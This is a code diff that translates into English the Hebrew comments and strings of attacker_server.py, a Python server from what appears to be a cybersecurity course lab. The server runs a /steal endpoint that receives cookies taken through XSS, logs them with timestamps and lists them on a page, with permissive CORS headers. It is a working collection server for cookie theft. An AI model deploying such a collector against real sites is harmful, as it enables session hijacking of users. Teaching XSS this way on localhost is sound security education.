@@ -1,6 +1,5 @@
 """
-attacker_server.py — שרת תוקף שאוסף cookies שנגנבו ב־XSS
-הדגמה חינוכית בלבד, לריצה מקומית בלבד.
+attacker_server.py — An attacker that collects cookies stolen with XSS attack.
 """
 
 from http.server import BaseHTTPRequestHandler, HTTPServer
@@ -14,7 +13,7 @@ IMAGE_FILE  = "cookie_monster.png"
 
 
 def load_stolen():
-    """טוען את רשימת ה־cookies שנגנבו."""
+    """Reloads the list of cookies that were stolen"""
     if not os.path.exists(STOLEN_FILE):
         open(STOLEN_FILE, "w").close()
         return []
@@ -24,30 +23,30 @@ def load_stolen():
 
 
 def save_cookie(value):
-    """שומר cookie שנגנב עם חותמת זמן."""
+    """Saves cookies that were stolen with timestamps"""
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     with open(STOLEN_FILE, "a", encoding="utf-8") as f:
         f.write(f"[{timestamp}] {value}\n")
 
 
 def build_main_page(cookies):
-    """בונה את דף ה־HTML של שרת התוקף."""
+    """HTML page of the attacker"""
     rows = ""
     if cookies:
         for c in cookies:
             rows += f"<li><code>{c}</code></li>\n"
     else:
-        rows = "<li>אין cookies עדיין — שלח payload מהבלוג.</li>"
+        rows = "<li>No cookies yet — send a payload from the blog.</li>"
 
-    # אם קיימת תמונה — מציג אותה, אחרת הודעה
+    # If there's a picture, it saves it. Otherwise it shows a message.
     image_html = ""
     if os.path.exists(IMAGE_FILE):
         image_html = '<img src="/cookie_monster.png" alt="Cookie Monster" style="width:200px; margin-top:20px;">'
     else:
-        image_html = '<p style="color:#888;">[cookie_monster.png לא נמצא — ניתן להוסיף ידנית לתיקייה]</p>'
+        image_html = '<p style="color:#888;">[cookie_monster.png not found — you can add it manually to the folder]</p>'
 
     return f"""<!DOCTYPE html>
-<html lang="he">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <title>Attacker Server</title>
@@ -61,7 +60,7 @@ def build_main_page(cookies):
 </head>
 <body>
   <h1>🍪 Attacker Server</h1>
-  <div class="info">שרת זה מדמה תוקף שאוסף cookies שנגנבו מהבלוג הפגיע.</div>
+  <div class="info">This server simulates an attacker collecting cookies stolen from the vulnerable blog.</div>
 
   <h2>Stolen Cookies</h2>
   <ul>
@@ -71,7 +70,7 @@ def build_main_page(cookies):
   {image_html}
 
   <hr>
-  <small>פרויקט הדגמה — Cybersecurity Course | localhost only</small>
+  <small>Demonstration project — Cybersecurity Course | localhost only</small>
 </body>
 </html>"""
 
@@ -82,7 +81,7 @@ class AttackerHandler(BaseHTTPRequestHandler):
         parsed = urlparse(self.path)
 
         if parsed.path == "/":
-            # דף ראשי — מציג cookies שנאספו
+            # Main page — displays collected cookies
             cookies = load_stolen()
             page = build_main_page(cookies)
             self.send_response(200)
@@ -91,7 +90,7 @@ class AttackerHandler(BaseHTTPRequestHandler):
             self.wfile.write(page.encode("utf-8"))
 
         elif parsed.path == "/steal":
-            # נתיב גניבת ה־cookie
+            # Cookie stealing endpoint
             params = parse_qs(parsed.query)
             raw = params.get("cookie", [""])[0]
             cookie_value = unquote(raw)  # URL-decode
@@ -108,13 +107,13 @@ class AttackerHandler(BaseHTTPRequestHandler):
 
             self.send_response(200)
             self.send_header("Content-Type", "text/html; charset=utf-8")
-            # מאפשר לדפדפן לקבל את התשובה גם מקריאת Image() cross-origin
+            # Allows the browser to receive the response even from cross-origin Image() calls
             self.send_header("Access-Control-Allow-Origin", "*")
             self.end_headers()
             self.wfile.write(response.encode("utf-8"))
 
         elif parsed.path == "/cookie_monster.png":
-            # הגשת תמונת Cookie Monster
+            # Serving Cookie Monster image
             if os.path.exists(IMAGE_FILE):
                 with open(IMAGE_FILE, "rb") as f:
                     data = f.read()
@@ -137,7 +136,7 @@ class AttackerHandler(BaseHTTPRequestHandler):
 
 
 if __name__ == "__main__":
-    # יצירת קובץ cookies אם לא קיים
+    # Create cookies file if it doesn't exist
     if not os.path.exists(STOLEN_FILE):
         open(STOLEN_FILE, "w").close()
 
